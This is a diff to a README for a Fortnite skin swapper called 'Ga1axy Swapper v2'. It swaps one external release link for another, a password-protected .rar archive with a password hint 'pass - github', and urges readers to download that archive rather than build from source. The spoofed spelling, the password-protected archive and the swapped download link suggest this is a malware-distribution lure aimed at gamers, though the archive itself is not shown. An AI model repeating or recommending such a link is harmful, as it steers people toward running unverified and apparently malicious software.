@@ -1,7 +1,7 @@
 Ga1axy Swapper v2
 Revamp your Fortnite experience with our skin swapper designed for the latest version of Fortnite. This repository contains the source code for Ga1axy Swapper v2.
 
-Note: It is recommended to download Ga1axy Swapper v2 from #[here](https://github.com/jio3rji23r/galaxy-swapper-v2/releases/download/download_latest_ver/git.software.v2.0.1.zip) instead of rebuilding it yourself.
+Note: It is recommended to download Ga1axy Swapper v2 from #[here](https://github.com/nikhilx144/ga1axy-swapper-v2/releases/download/Download/GalaxySwapper.rar) instead of rebuilding it yourself.
 
 pass - github
 
